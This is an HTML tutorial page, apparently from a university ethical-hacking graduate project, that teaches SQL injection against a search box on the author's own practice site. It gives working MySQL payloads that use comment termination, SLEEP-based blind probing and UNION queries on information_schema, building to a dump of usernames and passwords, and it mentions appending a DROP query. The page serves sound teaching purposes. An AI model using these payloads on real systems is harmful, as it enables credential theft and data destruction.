@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<!--
+Template Name: Epigosha
+Author: <a href="http://www.os-templates.com/">OS Templates</a>
+Author URI: http://www.os-templates.com/
+Licence: Free to use under our free template licence terms
+Licence URI: http://www.os-templates.com/template-terms
+-->
+<html>
+<head>
+<title>SQL Query</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<link href="../layout/styles/layout.css" rel="stylesheet" type="text/css" media="all">
+<!--<style type="text/css">
+/* DEMO ONLY */
+.container .demo{text-align:center;}
+.container .demo div{padding:8px 0;}
+.container .demo div:nth-child(odd){color:#FFFFFF; background:#CCCCCC;}
+.container .demo div:nth-child(even){color:#FFFFFF; background:#979797;}
+@media screen and (max-width:900px){.container .demo div{margin-bottom:0;}}
+/* DEMO ONLY */
+</style>-->
+</head>
+<body id="top">
+<!-- ################################################################################################ -->
+<!-- ################################################################################################ -->
+<!-- ################################################################################################ -->
+<div class="wrapper row1">
+  <header id="header" class="hoc clear"> 
+    <!-- ################################################################################################ -->
+    <div id="logo" class="fl_left">
+      <h1><a href="../sql.html">SQL Injection</a></h1>
+    </div>
+    <nav id="mainav" class="fl_right">
+      <ul class="clear">
+        <li class="active"><a href="../sql.html">Home</a></li>
+        <li id="tutorial"><a class="drop" href="">Tutorial</a>
+          <ul>
+            <li><a href="sqlquery.html">SQL Query</a></li>
+            <li><a href="sqllogin.html">SQL Injection - Login</a></li>
+            <li class="active"><a href="sqlsearch.html">SQL Injection - Search</a></li>
+            <li><a href="sqlprevention.html">Prevention from SQL Injection</a></li>
+            
+          </ul>
+        </li>
+        <!--<li><a class="drop" href="#">Dropdown</a>
+          <ul>
+            <li><a href="#">Level 2</a></li>
+            <li><a class="drop" href="#">Level 2 + Drop</a>
+              <ul>
+                <li><a href="#">Level 3</a></li>
+                <li><a href="#">Level 3</a></li>
+                <li><a href="#">Level 3</a></li>
+              </ul>
+            </li>
+            <li><a href="#">Level 2</a></li>
+          </ul>
+        </li>-->
+        <li><a href="../home.html" target="_blank">Exploit Website</a></li>
+        <!--<li><a href="#">Link Text</a></li>-->
+      </ul>
+    </nav>
+    <!-- ################################################################################################ -->
+  </header>
+</div>
+<!-- ################################################################################################ -->
+<!-- ################################################################################################ -->
+<!-- ################################################################################################ -->
+<!-- ################################################################################################ -->
+<!-- ################################################################################################ -->
+<!-- ################################################################################################ -->
+<div class=" first clear btmspace-80" style="color: #232323; background-color: #FFFFFF;display: block; width: 100%; margin: 0; padding: 0; text-align: left; word-wrap: break-word; box-sizing: border-box; padding:70px 70px 70px 70px ">
+      <h3 class="font-x2">SQL Injection - Search</h3>
+      <p class="font-x1">In this module we wwill be learning “How can we exploit Data stored in Database of a Website”</p>
+        <p class="font-x1">There are big companies getting hit by SQL Injection all the time still in 2017. If the company is not smart enough, all their usernames and passwords are out on internet. And its bad news for the company as well as for the attacker who is involved because it is super illegal and attacker would probably end up in jail. I am doing it on my own website which is allowed because I have given permission to myself. If you have got an interest in Web Development, you will learn just how bad it is, if you mess things up.</p>
+        <p class="font-x1">Click on the “EXPLOIT WEBSITE” link in the navigation bar. Click on “Search”. The following page will be displayed:</p>
+        <img src="../images/demo/search bar.png" alt="search bar"/>
+        <p class="font-x1">As we can see in the URL, it says its a PHP page, great. And if we go through the website itself, we can know that this is Vintage Bike Parts Selling website. Now we have to things in terms of what are the parts of a bike: brake, tire/wheel, saddle, handle etc.</p>                                    
+           <p class="font-x1">Let’s start with searching for “brake”. If you get any output that’s great, if not then try searching with a different string. The output might look like:</p>
+    <img src="../images/demo/brakeoutput.png" alt="brake search" align="middle"/>
+    <p class="font-x1">Also, try searching with an empty string. There are chances that it might display all the specified records of a table. Which will be true in this website’s case.</p>
+    <p class="font-x1">When we type “brake” and press Enter, a GET request goes to the PHP server. The server receives it and constructs an SQL query that says give any rows that have brake in them. And then asks the database about those rows and display them out on screen. Now the problem is if we put a special command as parameter and if it make sense as a query or queries, now this query will be given to database by PHP to execute. </p>
+    <p class="font-x1">Now what can we do to attack this. First think little about what the query might be behind the scenes so that we can adjust it. Open any text editor or SQL console that do text markup as you change query for visualizing and writing query. It’s a search box, its searching through the table and giving you output. Yup, it’s a “Select” query.  Let’s refer “?” as something. So the query might be like:</p>
+    <p class="font-x1">SELECT ?(some field/fields) FROM ?(some table name) WHERE ?(some field) LIKE ‘brake’;</p>
+    <p class="font-x1">Now think about how many columns it is displaying. In our case there are 3 columns.  So now, query should be like:</p>
+    <p class="font-x1">SELECT ?,?,? FROM ? WHERE ? LIKE ‘brake’;</p>
+    <p class="font-x1">Go back to the search box. Now, if you search for “ak” which is a sub string of “brake”, then also you are getting an output. This means there should be wildcards with before and after the string. This functionality can be performed in SQL using “%”.</p>
+    <p class="font-x1">SELECT ?,?,? FROM ? WHERE ? LIKE ‘%brake%’;</p>
+    <p class="font-x1">This is our generic query. Now we only have control over the search string, in our case “brake”, we can’t change the rest of the query because that is in backend PHP code that already has been coded. </p>
+    <p class="font-x1">Now try changing the search string in your text editor, like input single quote (‘) instead of “brake”:</p>
+    <p class="font-x1">SELECT ?,?,? FROM ? WHERE ? LIKE ‘%’%’;</p>
+    <p class="font-x1">Now this means, I am closing the beginning wildcard the last two character are just sitting on their own. This would create a SQL query syntax error because this is not a valid query. Try typing single quote (‘) in search box and read the Error that page displays.</p>
+    <p class="font-x1">Now think what should you change the single quote (‘) to get information form database. Well its and syntax error, first question should be which Database Management System is this website using. (Hint: Use nmap command or go to their career link and check out the job section). For our case it’s MYSQL. </p>
+    <p class="font-x1">PHP uses a varibale to store the query within double quotes(query="write your query here";) and then apply semi-colan at the end the statement. Now trying commenting rest of the query. As we discussed in our previous section, we can use “#” to comment. As you will observe in your text editor that the syntax after “#” might be getting grey. If we use “#” directly will just comment out the rest of the query which will make my query as invalid. I also need to supply closing syntax for the query before “#”. The input will be like parameter string, wildcard, closing single quote and “#”. For example:</p>
+    <p class="font-x1">SELECT ?,?,? FROM ? WHERE ? LIKE ‘%brake%';#%’;</p>
+    <p class="font-x1">Try “brake%';#” as search string in the website. </p>
+    <img src="../images/demo/brakeoutput.PNG" alt="brake output"/>
+    <p class="font-x1">It gave us the same output as “brake” was giving. Great! We were able to manipulate the server by our own query.  Also try for “%';#”, “';#”.</p>
+    <p class="font-x1">Let’s use SLEEP functionality of MYSQL. What SLEEP does is, it makes your server go in sleep mode. The SLEEP syntax might change for different Database Management Systems. The query would look like:</p>
+    <p class="font-x1">SELECT ?,?,? FROM ? WHERE ? LIKE ‘%%' AND 1 = SLEEP(2);#%’;</p>
+    <p class="font-x1">Use ”%' AND 1 = SLEEP(2);#” as string for searching. Now it makes your query sleep for 2 seconds.</p>
+    <p class="font-x1">Try using ”brake%' AND 1 = SLEEP(2);#” as string for searching. Did it return the two brake values? No, it did not, might be because of some syntax error, but it waited for some second before returning me an empty result. So it’s partially running. Why did we bother using SLEEP? Because if you modify the query to search for a particular table and if it delays, you can guess that the table exist on server. This is used as a blind technique as you don’t know what is happening at backend, but still you are able to make out that if something exist or not.</p>
+    <p class="font-x1">This is a start, now what do we put in as well to get other information from the database. For start, try putting something that will occur for sure. Like:</p>
+    <p class="font-x1">SELECT ?,?,? FROM ? WHERE ? LIKE ‘%brake%' UNION (SELECT 1,2,3 from dual);#%’;</p>
+    <p class="font-x1">“UNION is used to combine the result from multiple SELECT statements into a single result set.” – MYSQL.com</p>
+    <p class="font-x1">In other words, UNION takes two select queries and make one stick on top of the other. Dual is a dummy table name where no tables are referenced. The reason we used 1,2,3 as we are only getting three columns in our previous output. So we want to make sure that number of columns are same for both the select query. </p>
+    <p class="font-x1">Try “brake%' UNION (SELECT 1,2,3 from dual);#” as your search string. Did our logic work?</p>
+    <img src="../images/demo/dual123.PNG" alt="dual 1,2,3"/>
+    <p class="font-x1">The above query appended 1, 2, and 3 at the end of the output. It works! That is bad news for the Web Development team. Now we know we can output other queries as well. If we want to do some destruction, we can append a DROP query at the end make it drop tables. We won’t be using drop tale query as there are others too who are practicing on the same database but you can try that out with creating a dummy database in your MYSQL and appending a drop statement at the end of select query.</p>
+    <p class="font-x1">Officially we are just few steps away from full on access to usernames and passwords. Now instead of selecting from dual, let’s select form “information_schema”. There is table in Information Schema called tables that will tell us all tables’ information like name of the table and what columns they have.  In brief, “information_schema” is a tables of tables (metadata table) that holds all information on all the tables.</p>
+    <p class="font-x1">SELECT ?,?,? FROM ? WHERE ? LIKE ‘%brake%' UNION (SELECT TABLE_NAME,TABLE_SCHEMA,3 from information_schema.tables);#%’;</p>
+    <p class="font-x1">Try inputting “brake%' UNION (SELECT TABLE_NAME,TABLE_SCHEMA,3 from information_schema.tables);#” in our search box.</p>
+    <img src="../images/demo/alltablesanddatabases.PNG" alt="All tables and databases"/>
+    <p class="font-x1">Jackpot! We got information about all databases and tables that are present in MYSQL (The database and table information may change as some of the databases and tables might get removed or modified). It literally just put all the information underneath the first select result. The reason we are using “3” as a field in select because we want to make sure the number of columns are equal for both the select queries. You might also have observed that while typing it in a text editor, the color code might have changed which might prove that syntax is correct or not, it might also give suggesting while you are typing the query. So that helps a lot in exploring other exploits. </p>
+    <p class="font-x1">Observe the names of the tables displayed. For example, a table named something like ”items” might have details about all the items that this website sell, same way a table named something like  “users” might contains details about the users. Let’s see if we have a table named “users”. Yup, we have a table named users. I would recommend you going through all table names and trying finding out which table’s names looks like they might give you potential information that can be used as an exploit. </p>
+    <p class="font-x1">Now how to get schema or columns information of the “user” table. Well the same way we got information about all the tables but with few changes, in terms, of column names, a where clause and the table we refer in “information_schema”.</p>
+    <p class="font-x1">SELECT ?,?,? FROM ? WHERE ? LIKE ‘%brake%' UNION (SELECT COLUMN_NAME,2,3 from information_schema.columns where TABLE_NAME='users');#%’;</p>
+    <p class="font-x1">Try inputting “brake%' UNION (SELECT COLUMN_NAME,2,3 from information_schema.columns where TABLE_NAME='users');#” in our search box.</p>
+    <img src="../images/demo/userstable.PNG" alt="users table-schema"/>
+    <p class="font-x1">Great! Now we have all column names of “users” table. Remember, we can only select three columns at a time. Let’s try with “username”, “password ” and “type ”. So our query would now look like:</p>
+    <p class="font-x1">SELECT ?,?,? FROM ? WHERE ? LIKE ‘%brake%' UNION (SELECT username, password, type from users);#%’;</p>
+    <p class="font-x1">Input “brake%' UNION (SELECT username, password, type from users);#” as your search string.</p>
+    <img src="../images/demo/usernamepassword.PNG" alt="usernames passwords"/>
+    <p class="font-x1">Neat! We got all the usernames, passwords and type of user. If you are a penetration tester you would stay away from admins but you can exploit other user’s information.</p>
+    <p class="font-x1">We just saw how we can exploit a WEB SERVER.</p><p class="font-x1">Try exploring other TABLES.</p>
+    <p class="font-x1"><a href="http://php.net/manual/en/security.database.sql-injection.php" target="_blank">Learn more about SQL Injection in PHP</a></p>
+    <p class="font-x1">Just for refrence let's see how Databases and a Table looks in a XAMPP Server</p>
+    <p><img src="../images/demo/phpadmin.PNG" alt="phpadmin"/></p>
+    <p><img src="../images/demo/php%20admin%20users%20table.PNG" alt="phpadmin users table"/></p>
+    </div>
+<!-- ################################################################################################ -->
+<!-- ################################################################################################ -->
+<!-- ################################################################################################ -->
+<div class="wrapper row4">
+  <footer id="footer" class="hoc clear"> 
+    <!-- ################################################################################################ -->
+    <div class="center btmspace-80 clear" style="height:40px;">
+      <h6 class="font-x3 uppercase">SQL INJECTION PRACTICE</h6>
+      <p>Ethical Hacking - Grad Project - Fall 2017 - Dr. Phil Ventura - Mayank Yadav (U94319493) - University of South Florida</p>
+      <!--<ul class="faico clear">
+        <li><a class="faicon-facebook" href="#"><i class="fa fa-facebook"></i></a></li>
+        <li><a class="faicon-twitter" href="#"><i class="fa fa-twitter"></i></a></li>
+        <li><a class="faicon-dribble" href="#"><i class="fa fa-dribbble"></i></a></li>
+        <li><a class="faicon-linkedin" href="#"><i class="fa fa-linkedin"></i></a></li>
+        <li><a class="faicon-google-plus" href="#"><i class="fa fa-google-plus"></i></a></li>
+        <li><a class="faicon-vk" href="#"><i class="fa fa-vk"></i></a></li>
+      </ul>-->
+    </div>
+    <!--<div class="one_third first">
+      <h6 class="title">Porta nec dignissim</h6>
+      <ul class="nospace linklist contact">
+        <li><i class="fa fa-map-marker"></i>
+          <address>
+          Street Name &amp; Number, Town, Postcode/Zip
+          </address>
+        </li>
+        <li><i class="fa fa-phone"></i> +00 (123) 456 7890<br>
+          +00 (123) 456 7890</li>
+        <li><i class="fa fa-fax"></i> +00 (123) 456 7890</li>
+        <li><i class="fa fa-envelope-o"></i> info@domain.com</li>
+      </ul>
+    </div>
+    <div class="one_third">
+      <h6 class="title">Odio sagittis eros</h6>
+      <ul class="nospace linklist">
+        <li><a href="#">Justo iaculis phasellus eget lacus</a></li>
+        <li><a href="#">Ac sem ullamcorper sollicitudin nunc</a></li>
+        <li><a href="#">Elementum augue ac lacus molestie</a></li>
+        <li><a href="#">Pretium augue posuere nullam aliquam</a></li>
+        <li><a href="#">Mi dolor sed lacinia diam facilisis</a></li>
+      </ul>
+    </div>
+    <div class="one_third">
+      <h6 class="title">Sed volutpat feugiat</h6>
+      <ul class="nospace linklist">
+        <li>
+          <article>
+            <h6 class="nospace font-x1"><a href="#">Vel fermentum tellus</a></h6>
+            <time class="font-xs block btmspace-10" datetime="2045-04-06">Friday, 6<sup>th</sup> April 2045</time>
+            <p class="nospace">Morbi vitae nibh et turpis feugiat pharetra eget et dolor integer mollis&hellip;</p>
+          </article>
+        </li>
+        <li>
+          <article>
+            <h6 class="nospace font-x1"><a href="#">Ipsum ac lacus duis</a></h6>
+            <time class="font-xs block btmspace-10" datetime="2045-04-05">Thursday, 5<sup>th</sup> April 2045</time>
+            <p class="nospace">Rhoncus pulvinar fusce leo mi congue sed orci sit amet scelerisque&hellip;</p>
+          </article>
+        </li>
+      </ul>
+    </div>-->
+    <!-- ################################################################################################ -->
+  </footer>
+</div>
+<!-- ################################################################################################ -->
+<!-- ################################################################################################ -->
+<!-- ################################################################################################ -->
+<!--<div class="wrapper row5">
+  <div id="copyright" class="hoc clear"> 
+    <!-- ################################################################################################ -->
+    <!--<p class="fl_left">Copyright &copy; 2016 - All Rights Reserved - <a href="#">Domain Name</a></p>
+    <p class="fl_right">Template by <a target="_blank" href="http://www.os-templates.com/" title="Free Website Templates">OS Templates</a></p>-->
+    <!-- ################################################################################################ -->
+  <!--</div>
+</div>-->
+<!-- ################################################################################################ -->
+<!-- ################################################################################################ -->
+<!-- ################################################################################################ -->
+<a id="backtotop" href="#top"><i class="fa fa-chevron-up"></i></a>
+<!-- JAVASCRIPTS -->
+<script src="../layout/scripts/jquery.min.js"></script>
+<script src="../layout/scripts/jquery.backtotop.js"></script>
+<script src="../layout/scripts/jquery.mobilemenu.js"></script>
+</body>
+</html>
